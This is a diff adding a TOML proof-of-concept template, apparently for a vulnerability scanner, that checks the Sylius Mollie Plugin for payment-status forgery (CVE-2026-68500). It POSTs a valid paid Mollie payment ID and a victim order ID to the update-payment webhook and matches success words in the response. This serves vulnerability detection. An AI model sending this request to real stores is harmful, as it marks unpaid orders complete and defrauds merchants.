@@ -1,0 +1,41 @@
+[info]
+author = "AVE"
+description = "通过 POST 请求向 Sylius Mollie Plugin 的支付 Webhook 端点发送攻击者可控的 id（有效已支付 Mollie 支付 ID）和 orderId（受害订单 ID）参数，验证是否存在未授权支付状态篡改漏洞。若受害订单被标记为已完成，则漏洞存在。"
+id = "POC-AVE-2026-0975"
+name = "Sylius Mollie Plugin 支付状态伪造 PoC"
+severity = "high"
+tags = [
+    "cve-2026-68500",
+    "payment-forgery",
+    "authorization-bypass",
+]
+vuln_id = [
+    "CVE-2026-68500",
+    "AVE-2026-0975",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/en_US/update-payment"
+protocol = "http"
+
+[poc.requests.body]
+content = "id=ord_{{valid_mollie_payment_id}}&orderId={{victim_order_id}}"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "completed",
+    "paid",
+    "success",
+]
